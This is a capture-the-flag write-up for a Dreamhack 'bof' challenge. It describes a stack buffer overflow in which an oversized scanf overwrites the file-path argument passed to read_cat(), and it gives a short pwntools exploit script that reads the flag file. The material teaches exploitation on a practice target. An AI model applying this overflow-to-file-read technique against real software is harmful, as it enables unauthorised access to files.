Dreamhack - bof
Author : velix

###################
### 1. Analysis ###
###################

In the main() function, there is a buffer buf of size 128 bytes.
After reading user input with scanf("%144s", buf), the program calls read_cat(&local_18).
The variable local_18 is a 4-byte value located directly after buf on the stack. 

##########################
### 2. Vulnerabilities ###
##########################

There is a classic buffer overflow vulnerability.
Since scanf reads up to 144 bytes into a 128-byte buffer, it allows us to overwrite the value of local_18.
The overwritten local_18 is then used as the argument to read_cat(), which attempts to open and read from that file path.

#######################
### 3. Exploitation ###
#######################

from pwn import *

p = remote('host3.dreamhack.games', 18281)
read_cat = 0x401236

payload = b'A' * 128
#payload += b'B' * 8 (for RBP)
payload += b'/home/bof/flag'

p.sendline(payload)
p.interactive()

The file we want to read is /home/bof/flag.
I crafted a payload where:
I filled the first 128 bytes with junk ('A' * 128).
Then, I wrote the string /home/bof/flag\x00 starting at the local_18 position, directly after the buffer.
As a result, when read_cat() is called with &local_18, it receives the string /home/bof/flag and successfully opens the file.

#################
### 4. Result ###
#################

I successfully read the contents of /home/bof/flag and got the flag.
The exploitation worked by simply overflowing the buffer and placing the correct file path at the expected argument location.

// [ NOTE ]
// At first, I had no idea what the read_cat function was doing, so I was kind of lost.
// But through debugging, I realized it's really important to understand how open/read work together.
// Also, just overflowing the buffer with "A"s isn’t enough —
// you need to clearly understand what’s getting placed on the stack for the exploit to work properly.
// From now on, I won’t blindly spam "A"s — I’ll think carefully about what I’m writing and why.
